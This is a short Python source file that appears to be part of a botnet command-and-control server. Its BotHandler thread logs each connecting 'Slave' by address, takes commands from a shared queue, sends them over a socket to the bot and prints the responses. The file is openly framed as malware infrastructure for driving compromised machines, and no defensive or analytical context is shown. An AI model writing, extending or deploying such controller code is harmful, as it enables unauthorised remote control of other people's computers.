import socket
import threading




class BotHandler(threading.Thread):   

    def __init__(self, client, client_address, qv, clientList):
        threading.Thread.__init__(self)
        self.client = client
        self.client_address = client_address
        self.ip = client_address[0]
        self.port = client_address[1]
        self.q = qv
        self.clientList = clientList

    def run(self):
        BotName = threading.current_thread().getName()
        print("[*] Slave " + self.ip + ":" + str(self.port) +
              " connected with Thread-ID: ", BotName)
        self.clientList[BotName] = self.client_address
        while True:
            RecvBotCmd = self.q.get()
            try:
                self.client.send(RecvBotCmd.encode('utf-8'))
                recvVal = (self.client.recv(1024)).decode('utf-8')
                print(recvVal)
            except Exception as ex:
                # for t in Socketthread:
                #     if t.is_alive() == False:
                #         print("\n[!] Died Thread: " + str(t))
                #         t.join()
                print(ex)
                break
